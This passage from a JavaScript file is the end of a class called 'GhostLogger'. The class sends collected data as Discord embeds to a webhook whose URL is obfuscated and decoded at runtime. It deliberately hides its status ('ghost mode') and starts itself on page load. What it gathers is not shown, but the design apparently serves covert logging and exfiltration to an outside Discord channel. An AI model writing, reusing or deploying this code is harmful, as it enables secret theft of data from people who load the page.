            embeds: [embed],
            username: "GhostLogger"
        };

        const response = await fetch(this._dec(this.webhookUrl), {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify(payload)
        });

        if (!response.ok) {
            throw new Error(`Discord webhook failed: ${response.status}`);
        }

        return response;
    }

    // Ghost mode - no status updates visible
    updateStatus() {}
}

// Initialize ghost logger
window.addEventListener('load', () => {
    new GhostLogger();
});
